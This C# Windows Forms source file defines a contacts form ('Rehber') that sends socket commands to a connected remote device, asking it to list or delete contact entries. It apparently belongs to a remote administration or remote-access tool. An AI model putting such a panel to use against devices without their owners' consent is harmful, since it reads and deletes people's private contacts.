using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SV
{
    public partial class Rehber : Form
    {
        Socket sco; public string ID = "";
        public Rehber(Socket sck, string aydi)
        {
            InitializeComponent();
            ID = aydi; sco = sck;
        }

        private void ekleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Ekle(sco).Show();
        }

        private void silToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try { 
            byte[] bayt = Encoding.UTF8.GetBytes("REHBERSIL|" + listView1.SelectedItems[0].Text);
            Gonderici.Send(sco, bayt, 0, bayt.Length, 59999);
            }
            catch (Exception) { }
        }

        private void yenileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try { 
            byte[] bayt = Encoding.UTF8.GetBytes("REHBERIVER|");
            Gonderici.Send(sco, bayt, 0, bayt.Length, 59999);
            }
            catch (Exception) { }
        }
    }
}
